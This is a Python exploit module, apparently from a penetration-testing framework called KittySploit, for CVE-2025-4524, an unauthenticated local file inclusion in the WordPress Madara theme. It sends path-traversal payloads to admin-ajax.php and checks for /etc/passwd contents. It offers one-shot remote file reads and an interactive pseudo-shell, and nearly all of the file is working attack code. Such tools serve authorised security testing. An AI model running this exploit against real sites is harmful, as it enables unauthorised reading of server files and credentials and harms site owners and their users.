#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2025-4524 — Exploit Madara LFI (read remote files via admin-ajax). Use after scanner/scanner positive."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi

_PASSWD_LINE = re.compile(
    r"^[a-z_][a-z0-9_-]{0,31}:[^:\r\n]+:\d+:\d+:",
    re.MULTILINE | re.IGNORECASE,
)


def _looks_like_etc_passwd(body: str) -> bool:
    if not body or len(body) < 40:
        return False
    if re.search(r"^root:[x*!]:0:0:", body, re.MULTILINE):
        return True
    return len(_PASSWD_LINE.findall(body[:12000])) >= 3


def _has_madara_fingerprint(body: str) -> bool:
    if not body:
        return False
    t = body.lower()
    return "/wp-content/plugins/madara/" in t or 'id="madara' in t or "madara-core" in t


def _build_template_from_remote_path(remote_file: str, traversal_depth: int) -> str:
    rf = (remote_file or "").strip()
    if rf.startswith("/"):
        rf = rf[1:]
    depth = max(1, int(traversal_depth))
    return "plugins/" + ("../" * depth) + rf


def _madara_ajax_form(template: str) -> dict:
    return {
        "action": "madara_load_more",
        "page": "1",
        "template": template,
        "vars[orderby]": "meta_value_num",
        "vars[paged]": "1",
        "vars[timerange]": "",
        "vars[posts_per_page]": "16",
        "vars[tax_query][relation]": "OR",
        "vars[meta_query][0][relation]": "AND",
        "vars[meta_query][relation]": "AND",
        "vars[post_type]": "wp-manga",
        "vars[post_status]": "publish",
        "vars[meta_key]": "_latest_update",
        "vars[order]": "desc",
        "vars[sidebar]": "right",
        "vars[manga_archives_item_layout]": "big_thumbnail",
    }


_MADARA_HEADERS = {
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "*/*",
}


class Module(Auxiliary, Http_client, Lfi):

    __info__ = {
        "name": "WordPress Madara CVE-2025-4524 — LFI file read",
        "description": (
            "Exploits CVE-2025-4524: unauthenticated local file inclusion through the "
            "`madara_load_more` AJAX action. Uses lib.protocols.http.lfi (file_read / shell_lfi) for "
            "one-shot reads or interactive LFI pseudo-shell. Pair with "
            "scanner/http/wordpress_madara_cve_2025_4524 when vulnerable."
        ),
        "author": "KittySploit Team",
        "cve": "CVE-2025-4524",
        "platform": Platform.UNIX,
        "tags": ["web", "lfi", "wordpress", "madara", "cve-2025-4524", "auxiliary"],
        "references": [
            "CVE-2025-4524",
            "https://www.cve.org/CVERecord?id=CVE-2025-4524",
        ],
    }

    ajax_path = OptString(
        "/wp-admin/admin-ajax.php",
        "Path to admin-ajax.php (prefix with WordPress subdirectory if not at site root).",
        required=False,
        advanced=True,
    )
    fingerprint = OptBool(
        True,
        "Require Madara markers on GET / before exploit (fewer false positives).",
        required=False,
        advanced=True,
    )
    traversal_depth = OptInteger(
        7,
        "Number of '../' segments after 'plugins/' (default matches public PoC).",
        required=False,
        advanced=True,
    )
    template_override = OptString(
        "",
        "If set, full `template` value for a single read (ignored in shell_lfi; ignored per-path in shell).",
        required=False,
        advanced=True,
    )
    verify_first = OptBool(
        False,
        "If true, run the same check as the scanner (read /etc/passwd) before exploitation.",
        required=False,
        advanced=True,
    )
    max_output = OptInteger(
        65536,
        "Max characters of response body from execute() (0 = no limit).",
        required=False,
        advanced=True,
    )

    def _get_ajax_path(self) -> str:
        ajax = self.ajax_path.value if self.ajax_path.value else "/wp-admin/admin-ajax.php"
        if not ajax.startswith("/"):
            ajax = "/" + ajax
        return ajax

    def _get_bool(self, opt, default=True):
        if not hasattr(opt, "value"):
            return default
        v = opt.value
        if isinstance(v, str):
            return v.lower() in ("true", "yes", "1", "on")
        return bool(v)

    def _shell_lfi_enabled(self) -> bool:
        return self._get_bool(self.shell_lfi, False)

    def _truncate_response(self, body: str) -> str:
        lim = 65536
        if hasattr(self, "max_output") and self.max_output.value is not None:
            try:
                lim = int(self.max_output.value)
            except (TypeError, ValueError):
                lim = 65536
        if lim == 0:
            return body
        if len(body) > lim:
            return body[:lim]
        return body

    def execute(self, path: str) -> str:
        """
        Required by Lfi: perform one read via Madara LFI. Empty path returns '' (baseline for shell diff).
        """
        if path is None or not str(path).strip():
            return ""
        path = str(path).strip()
        ajax = self._get_ajax_path()
        override = (self.template_override.value or "").strip() if hasattr(self, "template_override") else ""
        if override and not self._shell_lfi_enabled():
            template = override
        else:
            depth = 7
            if hasattr(self, "traversal_depth") and self.traversal_depth.value is not None:
                try:
                    depth = int(self.traversal_depth.value)
                except (TypeError, ValueError):
                    depth = 7
            template = _build_template_from_remote_path(path, depth)

        payload = _madara_ajax_form(template)
        r = self.http_request(
            method="POST",
            path=ajax,
            data=payload,
            headers=dict(_MADARA_HEADERS),
            allow_redirects=False,
            timeout=30,
        )
        if not r:
            return ""
        body = r.text or ""
        out = self._truncate_response(body)
        mo = 65536
        if hasattr(self, "max_output") and self.max_output.value is not None:
            try:
                mo = int(self.max_output.value)
            except (TypeError, ValueError):
                mo = 65536
        if mo > 0 and len(body) > mo:
            print_warning(f"Truncated execute() output to {mo} chars (max_output)")
        return out

    def check(self):
        """Same detection logic as scanner/http/wordpress_madara_cve_2025_4524 (GET / fingerprint + POST /etc/passwd)."""
        try:
            ajax = self._get_ajax_path()
            if self._get_bool(self.fingerprint, True):
                home = self.http_request(method="GET", path="/", allow_redirects=True)
                if not home:
                    return {"vulnerable": False, "reason": "No response on GET /", "confidence": "low"}
                if not _has_madara_fingerprint(home.text or ""):
                    return {
                        "vulnerable": False,
                        "reason": "Madara fingerprint not found on GET /",
                        "confidence": "medium",
                    }

            template = _build_template_from_remote_path("/etc/passwd", 7)
            payload = _madara_ajax_form(template)
            r = self.http_request(
                method="POST",
                path=ajax,
                data=payload,
                headers=dict(_MADARA_HEADERS),
                allow_redirects=False,
                timeout=15,
            )
            if not r:
                return {"vulnerable": False, "reason": "No response on POST admin-ajax", "confidence": "low"}
            if r.status_code not in (200, 500):
                return {
                    "vulnerable": False,
                    "reason": f"Unexpected HTTP {r.status_code}",
                    "confidence": "medium",
                }
            body = r.text or ""
            if _looks_like_etc_passwd(body):
                return {
                    "vulnerable": True,
                    "reason": "CVE-2025-4524: /etc/passwd-like content in AJAX response",
                    "confidence": "high",
                }
            return {
                "vulnerable": False,
                "reason": "Response does not look like successful LFI (/etc/passwd markers missing)",
                "confidence": "medium",
            }
        except Exception as e:
            return {"vulnerable": False, "reason": str(e), "confidence": "low"}

    def run(self):
        print_info(f"Target: {self.target}:{self.port} — CVE-2025-4524 Madara LFI")

        verify_first = self._get_bool(self.verify_first, False)
        fp = self._get_bool(self.fingerprint, True)
        skip_fp = False

        if verify_first:
            print_status("verify_first: running scanner-equivalent check...")
            chk = self.check()
            if not chk.get("vulnerable"):
                print_error(f"Check failed: {chk.get('reason', 'unknown')}")
                return False
            print_success(f"Check OK: {chk.get('reason', '')}")
            skip_fp = True

        if fp and not skip_fp:
            home = self.http_request(method="GET", path="/", allow_redirects=True)
            if not home or not _has_madara_fingerprint(home.text or ""):
                print_error("Madara fingerprint not found on GET / (set fingerprint false to skip)")
                return False

        if self._shell_lfi_enabled():
            print_status("Starting LFI handler (lib.protocols.http.lfi — shell_lfi true)")
        else:
            fr = self.file_read.value if hasattr(self.file_read, "value") and self.file_read.value else "/etc/passwd"
            print_info(f"Single read via Lfi.handler_lfi (file_read={fr}); set shell_lfi true for interactive shell")

        self.handler_lfi()
        return True
